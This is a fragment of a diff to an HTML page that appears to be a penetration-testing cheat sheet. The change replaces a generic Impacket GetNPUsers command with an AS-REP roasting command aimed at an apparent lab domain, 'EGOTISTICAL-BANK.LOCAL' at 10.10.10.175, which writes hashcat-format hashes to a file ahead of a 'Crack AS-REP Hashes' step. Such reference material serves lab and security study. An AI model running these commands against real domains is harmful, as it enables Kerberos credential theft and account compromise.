@@ -141,8 +141,8 @@
   <button class="copy-btn" data-copy="impacket-GetNPUsers -dc-ip $dc-ip -request -outputfile hashes.txt domain.com/user">COPY</button>
   </pre>
 
-  <pre><code>GetNPUsers.py domain/user:password@$dc-ip -no-pass</code>
-  <button class="copy-btn" data-copy="GetNPUsers.py domain/user:password@$dc-ip -no-pass">COPY</button>
+  <pre><code>GetNPUsers.py 'EGOTISTICAL-BANK.LOCAL/' -usersfile users.txt -format hashcat -outputfile hashes.aspreroast -dc-ip 10.10.10.175</code>
+  <button class="copy-btn" data-copy="GetNPUsers.py 'EGOTISTICAL-BANK.LOCAL/' -usersfile users.txt -format hashcat -outputfile hashes.aspreroast -dc-ip 10.10.10.175">COPY</button>
   </pre>
 
   <h3>Crack AS-REP Hashes</h3>
